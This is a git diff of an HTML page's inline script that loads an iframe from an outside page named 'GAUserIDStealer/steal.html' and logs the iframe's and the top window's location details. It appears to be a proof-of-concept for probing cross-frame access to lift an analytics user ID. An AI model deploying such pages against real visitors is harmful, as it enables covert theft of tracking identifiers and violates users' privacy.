@@ -24,10 +24,18 @@
          cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
              
      }
-     function checklocation(){
+     doFlow();
+     checklocation();
+    </script>
+</head>
+
+<body>
+    
+    <script>
+        function checklocation(){
 //          const iframe = document.getElementById('fb_test');
          document.getElementById("fb_test").contentWindow.location.href
-         console.log('check_frame contentWindow : A',document.getElementById("fb_test").contentWindow);
+         console.log('check_frame body contentWindow : A',document.getElementById("fb_test").contentWindow);
          console.log('check_frame location href: A',document.getElementById("fb_test").contentWindow.location.href);
          console.log('check_frame location origin: A',document.getElementById("fb_test").contentWindow.location.origin);
 
@@ -37,17 +45,10 @@
          console.log('after A: TOP',window.top.location);
          console.log('after A: self',window.self.location);
      }
-     doFlow();
-     checklocation();
+        checklocation();
+//         console.log('A',window.location.origin);
+//         console.log('A window top !== window', window.top!==window);
     </script>
-</head>
-
-<body>
-    
-<!--     <script>
-        console.log('A',window.location.origin);
-        console.log('A window top !== window', window.top!==window);
-    </script> -->
 </body>
 
 </html>
